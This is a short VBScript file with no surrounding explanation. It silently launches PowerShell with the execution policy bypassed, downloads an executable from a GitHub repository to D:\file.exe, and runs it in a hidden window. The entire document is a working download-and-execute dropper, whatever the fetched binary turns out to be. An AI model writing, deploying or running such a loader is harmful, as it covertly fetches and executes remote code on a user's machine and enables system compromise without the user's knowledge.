Dim objShell
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -NoP -NonI -Exec Bypass -Command ""iwr -uri 'https://github.com/Kemelafrin/asdf/raw/refs/heads/main/calc.exe' -OutFile 'D:\file.exe'; Start-Process 'D:\file.exe'""", 0, False
